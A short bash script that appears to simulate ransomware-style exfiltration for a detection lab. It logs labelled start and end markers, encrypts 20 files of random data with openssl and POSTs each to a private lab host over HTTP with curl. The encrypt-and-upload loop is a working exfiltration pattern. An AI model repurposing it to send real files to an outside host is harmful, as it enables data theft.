#!/bin/bash
SRC_IP=$(hostname -i | awk '{print $1}')
TARGET_IP="192.168.50.99"
START=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$START,EXFIL_RANSOMWARE_START,$SRC_IP,$TARGET_IP"

SCRATCH=$(mktemp -d)
for i in $(seq 1 20); do
    dd if=/dev/urandom of="$SCRATCH/file$i.bin" bs=2M count=1 2>/dev/null
    openssl enc -aes-256-cbc -salt \
        -in "$SCRATCH/file$i.bin" \
        -out "$SCRATCH/file$i.enc" \
        -pass pass:labkey 2>/dev/null
    curl -s -X POST --data-binary @"$SCRATCH/file$i.enc" \
        "http://${TARGET_IP}:8080/upload" -o /dev/null 2>/dev/null || true
done
rm -rf "$SCRATCH"

END=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$END,EXFIL_RANSOMWARE_END,$SRC_IP,$TARGET_IP"
